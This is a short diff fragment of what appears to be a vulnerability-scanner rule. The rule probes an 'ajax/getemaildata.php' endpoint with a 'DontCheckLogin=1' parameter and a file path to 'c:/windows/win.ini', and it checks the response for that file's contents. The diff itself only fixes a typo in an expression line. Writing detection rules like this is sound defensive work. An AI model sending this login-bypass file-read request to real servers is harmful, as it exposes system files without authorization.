@@ -19,4 +19,4 @@ rules:
       method: GET
       path: /ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini
     expression: response.status == 200 && response.body.bcontains(b"bit app support") 
-expression: r0()+
+expression: r0()
